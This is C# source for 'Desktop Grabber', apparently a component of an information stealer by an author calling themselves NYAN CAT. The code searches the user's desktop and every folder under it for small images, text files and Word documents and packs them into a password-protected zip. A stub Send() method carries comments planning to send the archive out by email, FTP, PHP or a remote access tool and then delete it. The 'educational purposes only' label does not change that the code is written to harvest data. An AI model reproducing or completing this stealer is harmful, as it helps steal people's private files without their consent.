using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace DesktopGrabber
{
    public class Program
    {
        public static void Main()
        {
            new DesktopGrabber
            {
                Extensions = new List<string> { ".jpeg", ".jpg", ".txt", ".doc", ".docx" },
                SizeLimit = 50 * 1000,
                ZipName = "Desktop-Grabber.zip",
                ZipPassword = "nyan cat"
            }.Search();
        }
    }

    public class DesktopGrabber
    {

        /*
         * │ Author       : NYAN CAT
         * │ Name         : Desktop Grabber v0.1
         * │ Contact      : https:github.com/NYAN-x-CAT
         * 
         * This program is distributed for educational purposes only.
         */

        public string ZipName { get; set; }
        public string ZipPassword { get; set; }
        public int SizeLimit { get; set; }
        public List<string> Extensions { get; set; }

        public bool Search()
        {
            try
            {
                List<string> files = new List<string>();

                foreach (string file in Directory.GetFiles(Environment.GetFolderPath(0), "*.*", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length <= SizeLimit && Extensions.Contains(Path.GetExtension(file)))
                    {
                        files.Add(file);
                    }
                }
                if (files.Count == 0) return false;
                return Save(files);
            }
            catch { return false; }
        }

        private bool Save(List<string> files)
        {
            try
            {
                if (File.Exists(ZipName)) File.Delete(ZipName);
                Thread.Sleep(500);
                using (ZipFile zip = new ZipFile())
                {
                    zip.Password = ZipPassword;
                    foreach (string file in files)
                    {
                        zip.AddFile(file);
                    }
                    zip.Save(ZipName);
                }
                return true;
            }
            catch { return false; }
        }

        private bool Send()
        {
            // send it to email , ftp, php, rat
            // then delete zipName
            return true;
        }
    }
}
